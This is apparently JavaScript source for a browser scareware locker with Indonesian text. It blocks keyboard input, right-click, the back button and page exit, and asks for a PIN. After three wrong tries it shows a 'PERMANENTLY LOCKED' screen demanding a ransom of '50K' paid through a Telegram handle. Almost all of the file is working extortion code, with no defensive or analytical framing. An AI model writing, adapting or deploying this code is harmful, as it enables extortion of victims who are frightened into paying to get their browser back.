document.addEventListener('DOMContentLoaded', function() {
    // Real-time clock
    function updateTime() {
        const now = new Date();
        const timeStr = now.toLocaleTimeString('en-US', { 
            hour12: false, 
            hour: '2-digit', 
            minute: '2-digit' 
        }).slice(0, 5);
        document.getElementById('time').textContent = timeStr;
    }
    setInterval(updateTime, 1000);
    updateTime();

    // PIN Configuration
    const CONFIG = {
        pin: "202012", // Default PIN, bisa diubah via pin-config.txt
        ransomAmount: "50K",
        telegram: "@Rizzxdc",
        redirectUrl: "", // Kosongkan untuk tetap terkunci
        enablePersistence: true // Simpan status lock di localStorage
    };

    // Load custom config from pin-config.txt if available
    fetch('pin-config.txt')
        .then(response => response.text())
        .then(text => {
            const lines = text.split('\n');
            lines.forEach(line => {
                const [key, value] = line.split('=');
                if (key && value) {
                    const trimmedKey = key.trim();
                    const trimmedValue = value.trim();
                    if (trimmedKey === 'pin') CONFIG.pin = trimmedValue;
                    if (trimmedKey === 'ransomAmount') CONFIG.ransomAmount = trimmedValue;
                    if (trimmedKey === 'telegram') CONFIG.telegram = trimmedValue;
                    if (trimmedKey === 'redirectUrl') CONFIG.redirectUrl = trimmedValue;
                }
            });
        })
        .catch(() => {
            console.log("Using default configuration");
        });

    // State
    let enteredPin = "";
    const pinDisplay = document.getElementById('pinDisplay');
    const maxAttempts = 3;
    let attempts = 0;

    // Block all keyboard/mouse events
    document.addEventListener('keydown', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }, true);

    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    }, true);

    // Disable back button
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
        history.go(1);
    };

    // Keypad Logic
    document.querySelectorAll('.key[data-key]').forEach(button => {
        button.addEventListener('click', function() {
            const key = this.getAttribute('data-key');
            if (key === '➔') {
                enteredPin = enteredPin.slice(0, -1);
            } else if (enteredPin.length < CONFIG.pin.length) {
                enteredPin += key;
            }
            updatePinDisplay();
        });
    });

    // Delete Key
    document.getElementById('deleteKey').addEventListener('click', function() {
        enteredPin = enteredPin.slice(0, -1);
        updatePinDisplay();
    });

    // Unlock Button
    document.getElementById('unlockBtn').addEventListener('click', function() {
        if (enteredPin === CONFIG.pin) {
            unlockDevice();
        } else {
            attempts++;
            pinDisplay.textContent = "PIN SALAH!";
            pinDisplay.style.color = "#ff0000";
            setTimeout(() => {
                enteredPin = "";
                updatePinDisplay();
            }, 1000);

            if (attempts >= maxAttempts) {
                lockPermanently();
            }
        }
    });

    // Functions
    function updatePinDisplay() {
        if (enteredPin.length === 0) {
            pinDisplay.textContent = "masukan pin";
            pinDisplay.style.color = "#fff";
        } else {
            pinDisplay.textContent = "•".repeat(enteredPin.length);
            pinDisplay.style.color = "#fff";
        }
    }

    function unlockDevice() {
        pinDisplay.textContent = "TERBUKA!";
        pinDisplay.style.color = "#00ff00";
        
        if (CONFIG.redirectUrl) {
            setTimeout(() => {
                window.location.href = CONFIG.redirectUrl;
            }, 1000);
        } else {
            document.body.innerHTML = `
                <div style="
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: #000;
                    color: #0f0;
                    font-size: 24px;
                    text-align: center;
                    flex-direction: column;
                ">
                    <h1>DEVICE UNLOCKED</h1>
                    <p>Redirect dalam 5 detik...</p>
                </div>
            `;
            setTimeout(() => {
                window.location.reload();
            }, 5000);
        }
    }

    function lockPermanently() {
        document.body.innerHTML = `
            <div style="
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                background: #000;
                color: #f00;
                font-size: 20px;
                text-align: center;
                padding: 20px;
            ">
                <div>
                    <h1>🔒 PERMANENTLY LOCKED 🔒</h1>
                    <p>Hubungi Telegram: ${CONFIG.telegram}</p>
                    <p>Bayar ${CONFIG.ransomAmount} untuk unlock</p>
                    <p style="font-size: 14px; color: #888;">(Semua input dinonaktifkan)</p>
                </div>
            </div>
        `;
        
        // Disable all interactions
        document.addEventListener('click', (e) => e.preventDefault(), true);
        document.addEventListener('keydown', (e) => e.preventDefault(), true);
    }

    // Initialize
    updatePinDisplay();

    // Prevent leaving
    window.addEventListener('beforeunload', function(e) {
        e.preventDefault();
        e.returnValue = '';
        return 'Device terkunci!';
    });
});